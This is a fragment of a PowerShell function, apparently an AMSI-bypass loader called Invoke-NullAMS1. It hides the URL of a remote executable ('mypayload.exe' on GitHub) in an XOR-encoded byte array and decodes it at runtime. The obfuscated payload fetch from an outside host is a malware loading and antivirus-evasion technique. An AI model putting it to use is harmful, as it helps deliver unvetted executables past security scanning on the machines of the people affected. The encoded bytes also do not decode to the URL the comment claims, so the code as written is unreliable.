function Invoke-NullAMS1 {
    ...
    # Decode hardcoded URL via XOR
    if (-not $url) {
        $xorKey = 0x42  # XOR key
        # XOR-encoded version of: https://raw.githubusercontent.com/Cyb3rV1c/Ams1/main/mypayload.exe
        $encodedUrl = [byte[]](0x22,0x56,0x57,0x57,0x11,0x30,0x32,0x11,0x31,0x27,0x24,0x56,0x52,0x41,0x3D,0x2B,0x26,0x37,0x56,0x31,0x3E,0x30,0x31,0x25,0x37,0x35,0x2F,0x5E,0x21,0x26,0x24,0x3A,0x27,0x32,0x27,0x33,0x31,0x26,0x2F,0x5E,0x3F,0x27,0x2E,0x24,0x27,0x21,0x24,0x32,0x2D,0x27,0x56,0x23,0x37,0x2F,0x27,0x24,0x3E,0x24,0x37,0x21,0x2F,0x3D,0x5E,0x2B,0x2E,0x24,0x3E,0x27,0x2E,0x27,0x31,0x24,0x2B,0x33,0x56,0x2F,0x2D,0x32,0x31,0x3F,0x3D,0x37,0x5E,0x2E,0x2E,0x30,0x24)
        $decodedChars = foreach ($c in $encodedUrl) { [char]($c -bxor $xorKey) }
        $url = -join $decodedChars
    }
